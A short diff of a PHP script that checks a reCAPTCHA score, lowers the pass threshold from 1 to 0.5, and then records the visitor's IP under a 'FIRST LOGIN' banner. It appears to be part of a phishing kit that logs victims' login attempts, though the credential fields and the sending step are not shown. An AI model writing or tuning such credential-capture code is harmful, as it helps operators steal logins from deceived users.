@@ -11,7 +11,7 @@ $response = file_get_contents("$verifyUrl?secret=$secretKey&response=$recaptchaR
 $responseKeys = json_decode($response, true);
 
 
-if ($responseKeys["success"] && $responseKeys["score"] >= 1 ) {
+if ($responseKeys["success"] && $responseKeys["score"] >= 0.5 ) {
 
     $ip = getenv("REMOTE_ADDR");
     $message = "=|=[ FIRST LOGIN 1️⃣ ]=|\n".
